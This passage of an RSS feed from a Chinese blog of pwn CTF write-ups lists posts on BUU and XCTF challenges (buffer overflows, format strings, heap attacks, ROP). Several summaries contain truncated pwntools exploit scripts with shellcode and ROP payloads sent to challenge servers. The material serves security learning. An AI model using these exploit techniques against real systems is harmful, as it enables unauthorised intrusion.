res[i][j] += int(A[i][k])</description></item><item><title>HGAME2021-WEAK1-WP</title><link>https://www.cjovi.icu/wp/1044.html</link><pubDate>Sun, 07 Feb 2021 20:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1044.html</guid><description>许久没有更新博客了，主要是因为最近都在打 hgame，客观来讲题挺难的，别的方向的题没做过，就真的是都不会。这篇博客是 week1 中我解出来的题目的 wp 的</description></item><item><title>BUU-starctf_2019_quicksort-WP</title><link>https://www.cjovi.icu/wp/1040.html</link><pubDate>Fri, 29 Jan 2021 22:43:41 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1040.html</guid><description>不知不觉就在factorio中颓了一天，`所以就做了这么一道不能算难的题目。 这里s可以把ptr溢出掉实现任意地址写。注意gets是读到'\n</description></item><item><title>xctf-EasyPwn-WP</title><link>https://www.cjovi.icu/wp/1037.html</link><pubDate>Thu, 28 Jan 2021 10:34:49 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1037.html</guid><description>很久没做xctf的题了，这道题其实不难，但是漏洞点不容易看出来（菜如我就没看出来） 这里的v2其实是有溢出的，v2的大小仅有0x3EB，s的大</description></item><item><title>BUU-SWPUCTF_2019_login-WP</title><link>https://www.cjovi.icu/wp/1035.html</link><pubDate>Wed, 27 Jan 2021 17:42:23 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1035.html</guid><description>本来想改返回地址的，但是发现不论是one_gadget还是system都出现了dump core，据说是32位程序这样改返回地址很容易爆，我也</description></item><item><title>BUU-wustctf2020_easyfast-WP</title><link>https://www.cjovi.icu/wp/1034.html</link><pubDate>Wed, 27 Jan 2021 13:07:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1034.html</guid><description>fastbin attack水题，大概是House Of Spirit 存在UAF,所以也不需要double free了，申请两个chunk，free掉他们，由于fastbi</description></item><item><title>BUU-gyctf_2020_force-WP</title><link>https://www.cjovi.icu/wp/1033.html</link><pubDate>Wed, 27 Jan 2021 10:05:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1033.html</guid><description>报以复习的形态做了一下这道HOF裸题，结果还是学到了新知识，蛮好蛮好 HOF不想多说了，毕竟是挺简单的一种利用，此题中有谈及。 leak 每一个chun</description></item><item><title>BUU-wdb_2018_3rd_soEasy-WP</title><link>https://www.cjovi.icu/wp/1029.html</link><pubDate>Tue, 26 Jan 2021 13:08:01 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1029.html</guid><description>名字都取成这样了，也不想说什么了 #!/usr/bin/env python # coding=utf-8 from pwn import * context(log_level = &amp;#39;debug&amp;#39;,arch = &amp;#39;i386&amp;#39;,os = &amp;#39;linux&amp;#39;) #sh = process(&amp;#34;./wdb_2018_3rd_soEasy&amp;#34;) sh = remote(&amp;#34;node3.buuoj.cn&amp;#34;,29310) sh.recvuntil(&amp;#34;-&amp;gt;&amp;#34;) addr = int(sh.recvuntil(&amp;#34;\n&amp;#34;),base = 16) payload = asm(shellcraft.sh()) sh.sendlineafter(&amp;#34;do?\n&amp;#34;,payload.ljust(0x48 + 4,&amp;#39;a&amp;#39;) + p32(addr)) sh.interactive()</description></item><item><title>BUU-[BJDCTF 2nd]rci-WP</title><link>https://www.cjovi.icu/wp/1028.html</link><pubDate>Mon, 25 Jan 2021 20:19:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1028.html</guid><description>头图变成上篇文章的了，不知道为什么 Linux操作题，也不需要写什么脚本 程序很容易看，流程就是有一次ls的机会，第二次需要输入当前的目录，然后</description></item><item><title>BUU-picoctf_2018_leak_me-WP</title><link>https://www.cjovi.icu/wp/1023.html</link><pubDate>Sun, 24 Jan 2021 21:48:28 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1023.html</guid><description>这道题没什么难度，IDA没办法反编译，没办法，就硬看呗 有这个后门,需要我们输入一个正确的密码才可以执行，密码会先被读到内存中。 而我们会输入自</description></item><item><title>BUU-[极客大挑战 2019]Not Bad-WP</title><link>https://www.cjovi.icu/wp/1019.html</link><pubDate>Sun, 24 Jan 2021 16:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1019.html</guid><description>这题其实挺简单的，但是我还是没做出来:( 新的观点 原来在对于没开NX的题目可以考虑用jmp rsp的gadget啊！学到了。题目中有这个gadg</description></item><item><title>BUU-bcloud_bctf_2016-WP</title><link>https://www.cjovi.icu/wp/1018.html</link><pubDate>Sat, 23 Jan 2021 18:34:46 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1018.html</guid><description>发牢骚 考试周是真的烦，快一个星期没有碰pwn，做本题时的体验很差 知识点 本题是House Of系列中的House Of Force，也是我第一次接触H</description></item><item><title>BUU-inndy_echo3-WP</title><link>https://www.cjovi.icu/wp/1012.html</link><pubDate>Sat, 16 Jan 2021 15:01:03 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1012.html</guid><description>虽然马上就要期末考了，我应该好好复习数分，但是还是没忍住，花了不少时间pwn了这题。 这是我做过的最麻烦的fmt，知识并没有新增，还是“搭跳板</description></item><item><title>BUU-metasequoia_2020_blacksmith-WP</title><link>https://www.cjovi.icu/wp/1005.html</link><pubDate>Thu, 14 Jan 2021 19:09:51 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1005.html</guid><description>整数溢出，size_t是一个不小压力机器字长的无符号整型，然鹅判断长度的时候 这里用的是signed int，所以我们输入一个负数就可以轻松栈溢</description></item><item><title>BUU-picoctf_2018_buffer overflow 0-WP</title><link>https://www.cjovi.icu/wp/1001.html</link><pubDate>Tue, 12 Jan 2021 14:39:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1001.html</guid><description>今天好像都是水题嘛。不过这题使用ssh连接直接给了一个没root权限的shell 不过有一个vuln，就是题目给出的elf。 payload很好</description></item><item><title>BUU-cmcc_pwnme1-WP</title><link>https://www.cjovi.icu/wp/999.html</link><pubDate>Tue, 12 Jan 2021 11:11:07 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/999.html</guid><description>完成任务很开心。栈溢出水题，没什么可说的，直接exp吧 #!/usr/bin/env python # coding=utf-8 from pwn import * sh = remote(&amp;#34;node3.buuoj.cn&amp;#34;,29136) elf = ELF(&amp;#34;./pwnme1&amp;#34;) libc = ELF(&amp;#34;./libcs/buu-32-libc.so&amp;#34;) pop_ebp_ret = 0x80485f3 payload = &amp;#39;a&amp;#39; * 0xA4 + &amp;#39;b&amp;#39; * 0x4 + p32(elf.symbols[&amp;#34;puts&amp;#34;]) + p32(pop_ebp_ret) + p32(elf.got[&amp;#34;puts&amp;#34;]) payload += p32(0x8048570) sh.sendlineafter(&amp;#34;Exit \n&amp;#34;,&amp;#39;5&amp;#39;) sh.sendlineafter(&amp;#34;fruit:&amp;#34;,payload) sh.recvuntil(&amp;#34;..\n&amp;#34;) puts_addr</description></item><item><title>BUU-inndy_onepunch-WP</title><link>https://www.cjovi.icu/wp/997.html</link><pubDate>Mon, 11 Jan 2021 15:53:35 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/997.html</guid><description>哈哈这道题其实没什么可说的，一看只有一次修改一个字节的机会，自然没什么思路 但是此题代码段可修改，所以我们修改一个jmp short指令就可以让</description></item><item><title>BUU-starctf_2019_babyshell-WP</title><link>https://www.cjovi.icu/wp/994.html</link><pubDate>Sat, 09 Jan 2021 20:09:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/994.html</guid><description>这道题目很有意思，我很喜欢 分析 流程很简单 这里读入一段，然后 进入这样一个判断，做的事就是对我们输入的串中的每个字母在 这个字符串里找匹配，如果每</description></item><item><title>BUU-starctf2018_babystack-WP</title><link>https://www.cjovi.icu/wp/985.html</link><pubDate>Sat, 09 Jan 2021 16:24:50 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/985.html</guid><description>这道题是碰到知识盲区了 写在前面 这篇wp还不完善，之后再慢慢补全 漏洞点 非常明显的一个栈溢出，而且可以溢出非常多。当然，由于开了canary，我</description></item><item><title>KCTF-前世今生（PWN）/ASIS CTF Finals 2016 Heapstorm-WP</title><link>https://www.cjovi.icu/wp/979.html</link><pubDate>Thu, 07 Jan 2021 18:14:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/979.html</guid><description>最近为了学习_IO_FILE这一类的利用，在尝试阅读scanf的源码，想找一点参考资料，就到看雪论坛上面看了看，资料没找到反而是发现看雪也有</description></item><item><title>BUU-pwnable_simple_login/XCTF-formate2-WP</title><link>https://www.cjovi.icu/wp/970.html</link><pubDate>Wed, 06 Jan 2021 15:27:19 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/970.html</guid><description>很简单的一个栈溢出，本来还以为真的是什么高级密码学 这里有一个栈溢出。虽然只溢出了四个字节，但是由于input在bss段，其地址已知，我们可以</description></item><item><title>BUU-warmup(PWN)-WP</title><link>https://www.cjovi.icu/wp/964.html</link><pubDate>Wed, 06 Jan 2021 14:49:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/964.html</guid><description>这道题做的特别难受，也浪费了很多时间，确实是状态太差了。最近有一点小失意，发现好像什么题都不会做了。 这道题就是一个简单的ret2syscal</description></item><item><title>BUU-picoctf_2018_echooo-WP</title><link>https://www.cjovi.icu/wp/966.html</link><pubDate>Tue, 05 Jan 2021 23:37:42 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/966.html</guid><description>其实这题之前还做了一道，但是有点晚了，而且做这俩题浪费了很多时间，有点不高兴，那个的wp就明天再说吧 没什么可说的,偏移是8，nc上去%8$s</description></item><item><title>XCTF-250-WP</title><link>https://www.cjovi.icu/wp/960.html</link><pubDate>Mon, 04 Jan 2021 23:28:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/960.html</guid><description>这个 print，不仔细看怎么看的出来！（这个v4我愚蠢地以为是识别错误）浪费我半个小时想到底怎么用fmt利用！更可气的是xctf上还没什么人</description></item><item><title>XCTF-echo_back2-WP</title><link>https://www.cjovi.icu/wp/952.html</link><pubDate>Mon, 04 Jan 2021 13:32:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/952.html</guid><description>写在前面 由于我本地的环境和服务器完全不一样，所以这道题其实我完全没法做，看着wp云pwn了一下也算是学了一下scanf的部分实现了。 可见在本</description></item><item><title>XCTF-Aul-WP</title><link>https://www.cjovi.icu/wp/938.html</link><pubDate>Sat, 02 Jan 2021 22:31:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/938.html</guid><description>蛮好玩的一道题 一看附件暂无，抱着怀疑的心态nc了一下 进行了三次尝试后终于有光了，输入help试一下 发现输出了一堆奇怪的东西，说实话我就看懂了</description></item><item><title>XCTF/BUU/pwnable-dubblesort-WP</title><link>https://www.cjovi.icu/wp/919.html</link><pubDate>Sat, 02 Jan 2021 14:35:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/919.html</guid><description>灵感 故事是这样的，拿到题目放到ida里分析，发现是个冒泡，同时数组可以随便越界，又给了libc，感觉挺熟悉的，应该可切，然后到虚拟机里che</description></item><item><title>XCTF-1000levevls-WP</title><link>https://www.cjovi.icu/wp/903.html</link><pubDate>Fri, 01 Jan 2021 18:29:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/903.html</guid><description>一些废话 这道题目有一种更具普遍性的解法（xctf提供）即部分leak system然后爆破，但是这样的几率非常低（大约万分之一），大体是通过修</description></item><item><title>XCTF/BUU-babyfengshui-WP</title><link>https://www.cjovi.icu/wp/895.html</link><pubDate>Fri, 01 Jan 2021 12:32:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/895.html</guid><description>XCTF总是给出一个错误的libc，让我对无法get shell百思不得其解，真是不友好，以后统一用LibcSearcher解决libc的问题</description></item><item><title>XCTF-HMI流水灯运行-WP</title><link>https://www.cjovi.icu/wp/xctf-hmi%E6%B5%81%E6%B0%B4%E7%81%AF%E8%BF%90%E8%A1%8C-wp.html</link><pubDate>Wed, 30 Dec 2020 16:18:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/xctf-hmi%E6%B5%81%E6%B0%B4%E7%81%AF%E8%BF%90%E8%A1%8C-wp.html</guid><description>这道题目挺有点意思，也让我知道了工控安全在ctf是怎么体现的。 其实很简单 就是这样的一个栈溢出而已，几乎没有保护，我们可以为所欲为。但是需要特</description></item><item><title>BUU-qctf_2018_stack2-WP</title><link>https://www.cjovi.icu/wp/buu-qctf_2018_stack2-wp.html</link><pubDate>Tue, 29 Dec 2020 15:48:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/buu-qctf_2018_stack2-wp.html</guid><description>这道题是很明显的数组越界的漏洞，题目也给出了后门"hackhere"。于是自然的我考虑通过越界覆写return address实现ret2te</description></item><item><title>XCTF-easyfmt-WP</title><link>https://www.cjovi.icu/wp/xctf-easyfmt-wp.html</link><pubDate>Tue, 29 Dec 2020 11:46:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/xctf-easyfmt-wp.html</guid><description>easy是easy，但是特别麻烦。 简单的四步。 checkin没什么好办法，老老实实爆破，概率0.2，'0'-'4'都有可能 修改exit的go</description></item><item><title>BUU-actf_2019_babystack-WP</title><link>https://www.cjovi.icu/wp/buu-actf_2019_babystack-wp.html</link><pubDate>Tue, 29 Dec 2020 10:18:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/buu-actf_2019_babystack-wp.html</guid><description>一道简单的通过leave栈迁移实现更长的rop链的题 #!/usr/bin/env python # coding=utf-8 from pwn import * from LibcSearcher import * pop_rdi_ret = 0x400ad3 context(log_level = 'debug') sh = remote("node3.buuoj.cn","28568") #sh = process("./ACTF_2019_babystack") elf = ELF("./ACTF_2019_babystack") libc = ELF("./buu-libc-2.23.so") sh.sendlineafter("e?\n>",str(0xE0)) sh.recvuntil("at ") stackaddr = int(sh.recvuntil("\n",drop = True),base = 16) payload = 'fillfill' +</description></item><item><title>BUU-actf_2019_babyheap-WP</title><link>https://www.cjovi.icu/wp/buu-actf_2019_babyheap-wp.html</link><pubDate>Mon, 28 Dec 2020 17:45:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/buu-actf_2019_babyheap-wp.html</guid><description>此题和BUU&amp;XCTF-hitcontraining_uaf-WP很像，都是UAF，漏洞的原因也很像，漏洞点是 #!/usr/bin/env python # coding=utf-8 from pwn import * context(log_level = 'debug') #sh = process('./ACTF_2019_babyheap') sh</description></item><item><title>XCTF-4-reehy-main-100-WP</title><link>https://www.cjovi.icu/wp/xctf-4-reehy-main-100-wp.html</link><pubDate>Sun, 27 Dec 2020 21:13:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/xctf-4-reehy-main-100-wp.html</guid><description>这道题好难的感觉，看了别人的WP做了一天虽然是迷迷糊糊的拿到了flag但是还是有一点不能理解（2021.1.3更新：由于libc的问题被解决</description></item><item><title>XCTF-supermarket-WP</title><link>https://www.cjovi.icu/wp/xctf-supermarket-wp.html</link><pubDate>Fri, 25 Dec 2020 23:11:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/xctf-supermarket-wp.html</guid><description>写在前面：这篇WP很简陋，我只写了重点 堆的利用我也开始一步步的开始“上道”了，这是一道比较简单的堆溢出，主要的难点是程序比较复杂，分析比较麻</description></item></channel></rss>